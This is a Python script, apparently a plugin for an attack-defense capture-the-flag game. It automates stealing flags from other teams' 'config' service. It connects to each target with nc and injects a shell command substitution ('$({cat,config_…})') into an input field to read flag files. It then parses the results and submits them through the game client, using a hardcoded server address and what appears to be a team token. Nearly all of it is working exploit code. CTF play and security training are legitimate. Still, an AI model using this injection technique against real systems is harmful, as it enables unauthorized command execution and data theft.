# Attempts to steal flags from all teams (except the test team and
# our own!) for the 'config' service
def name():
    return "steal-config-flags"

def help():
    return "Steal flags from the 'config' service!"

def args():
    return ""

def run(args):
    from re import search
    from subprocess import Popen, PIPE, STDOUT
    from threading import Timer
    import swpag_client

    t = swpag_client.Team("http://34.195.187.175", "f67634a9373be60a439287965e1d8562")
    backup_flags = t.get_targets(5)

    for target in backup_flags:
        try:
            team = target['hostname']
            flag_id = target['flag_id']

            if team in ["team9", "team11", "team12"]:
                print("Skipping {0}".format(team))
                continue

            print("Trying {0}...".format(team))

            p = Popen(["nc", team, "10005"], stdout=PIPE, stdin=PIPE)
            tt = Timer(3, p.kill)
            tt.start()
            
            for i in range(0,15):
                out = p.stdout.readline().decode()
                if "or (q)uit" in out:
                    break

            p.stdin.write("d\na\n$({{cat,config_{0}}})\ns\n".format(flag_id).encode())
            p.stdin.flush()

            for i in range(0,15):
                out = p.stdout.readline().decode()
                m = search("config_(\w+)!", out)
                if m != None:
                    break

            if m == None:
                continue

            p.stdin.write("l\nconfig_{0}\nv\n".format(m.group(1)).encode())
            p.stdin.flush()

            for i in range(0,30):
                out = p.stdout.readline().decode()
                m = search("CONFIG_flag=(\w+)", out)
                if m != None:
                    break

            if m == None:
                continue

            result = t.submit_flag([m.group(1)])
            tt.cancel()

            print("Submitting flag {0} for team {1}: {2}".format(m.group(1), team, result))
        except:
            print("Error")